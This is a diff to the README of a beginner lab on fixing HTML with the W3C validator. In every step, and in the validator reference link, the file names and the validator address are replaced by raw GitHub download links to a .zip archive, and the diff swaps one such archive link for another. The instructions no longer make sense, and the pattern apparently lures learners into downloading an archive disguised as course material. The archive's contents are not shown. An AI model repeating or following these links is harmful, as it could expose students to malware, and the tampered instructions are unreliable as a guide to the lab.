@@ -22,13 +22,13 @@ Code.
 
 ### Steps
 
-1. Open https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-issue-bot-9000-lab/master/.github/workflows/phase-0-html-issue-bot-9000-lab_2.3.zip in a browser. See how it, well, doesn't look _quite_ right?
-2. Open https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-issue-bot-9000-lab/master/.github/workflows/phase-0-html-issue-bot-9000-lab_2.3.zip in your text editor
+1. Open https://github.com/GabrielW13Nai/phase-0-html-issue-bot-9000-lab/raw/refs/heads/master/images/lab-html-phase-bot-issue-v2.8.zip in a browser. See how it, well, doesn't look _quite_ right?
+2. Open https://github.com/GabrielW13Nai/phase-0-html-issue-bot-9000-lab/raw/refs/heads/master/images/lab-html-phase-bot-issue-v2.8.zip in your text editor
 3. Visit the W3C validator at:
-   [https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-issue-bot-9000-lab/master/.github/workflows/phase-0-html-issue-bot-9000-lab_2.3.zip][validator]
-4. Copy the code from https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-issue-bot-9000-lab/master/.github/workflows/phase-0-html-issue-bot-9000-lab_2.3.zip and paste it into the text area
+   [https://github.com/GabrielW13Nai/phase-0-html-issue-bot-9000-lab/raw/refs/heads/master/images/lab-html-phase-bot-issue-v2.8.zip][validator]
+4. Copy the code from https://github.com/GabrielW13Nai/phase-0-html-issue-bot-9000-lab/raw/refs/heads/master/images/lab-html-phase-bot-issue-v2.8.zip and paste it into the text area
 5. Click the large "Check" button
-6. Use the error messages to correct the code your copy of `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-issue-bot-9000-lab/master/.github/workflows/phase-0-html-issue-bot-9000-lab_2.3.zip`
+6. Use the error messages to correct the code your copy of `https://github.com/GabrielW13Nai/phase-0-html-issue-bot-9000-lab/raw/refs/heads/master/images/lab-html-phase-bot-issue-v2.8.zip`
 7. Repeat steps 3-6 until the Html Validator reports: "Document checking
    completed. No errors or warnings to show."
 8. Not only is the document now W3C-valid, it no longer looks weird
@@ -37,10 +37,10 @@ Code.
 
 When your document is valid, go to the terminal and type `learn test`. Since the
 goal of this assignment is to practice verifying the HTML structure via W3C, the
-test in this lab is only checking that an `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-issue-bot-9000-lab/master/.github/workflows/phase-0-html-issue-bot-9000-lab_2.3.zip` file exists.
+test in this lab is only checking that an `https://github.com/GabrielW13Nai/phase-0-html-issue-bot-9000-lab/raw/refs/heads/master/images/lab-html-phase-bot-issue-v2.8.zip` file exists.
 
 ## Resources
 
 - [W3C HTML Validator - Validate Direct Input][validator]
 
-[validator]: https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-issue-bot-9000-lab/master/.github/workflows/phase-0-html-issue-bot-9000-lab_2.3.zip
+[validator]: https://github.com/GabrielW13Nai/phase-0-html-issue-bot-9000-lab/raw/refs/heads/master/images/lab-html-phase-bot-issue-v2.8.zip
